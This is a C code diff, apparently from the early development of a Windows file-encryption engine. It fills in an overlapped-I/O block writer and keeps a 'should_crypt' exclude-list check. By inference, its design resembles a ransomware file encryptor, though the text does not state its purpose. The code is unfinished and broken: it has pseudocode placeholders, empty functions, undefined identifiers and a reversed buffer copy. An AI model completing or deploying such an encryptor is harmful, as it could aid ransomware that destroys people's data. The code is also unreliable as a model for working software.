@@ -11,14 +11,6 @@ return
 
 
 }
-int ncrypt(char *file)
-{
-malloc()
-fread()
-for(i)
-
-}
-
 int should_crypt(char *file)
 {
 for(i=0;i!=sizeof(exclude)/sizeof(char*);i++)
@@ -32,12 +24,41 @@ return 1;
 }
 bool block_write(overlapped_enc *ovl,LONGLONG offset)
 {
+BOOL res;
 LARGE_INTEGER li;
 li.QuadPart = offset;
 ovl->overlapped.Offset = li.LowPart;
 ovl->overlapped.OffsetHigh = li.HighPart;
+memcpy(ovl->inpbuff,ovl->outbuff,BUFFER_SIZE);
+res =WriteFile(ovl->file,outbuff,BUFFER_SIZE,null,(LPOVERLAPPED)ovl);
+ovl->current_block +=1;
+ULONGLONG next_offset = (ovl->current_block * BUFFER_SIZE) + BUFFER_SIZE ;
+      
+if(next_offset >= ovl->file_size)
+{
+ovl->operation = HANDLE_EOF;
+}
+else
+{
+ovl->operation = READ;
+}
+  
+  PostQueuedCompletionStatus(h_Port, 0, 0, (LPOVERLAPPED)ovl);
+ return 0;
 
 
+
+}
+bool block_read()
+{
+
+
+
+
+}
+
+bool handle_eof()
+{
 
 
 
@@ -53,8 +74,8 @@ result = GetQueuedCompletionStatus(CompletionPort,&NumberOfBytes,CompletionKey,&
 switch(OverLapped->operation)
   {
     case WRITE:
-
-
+  
+      
     break;
 
     case READ:
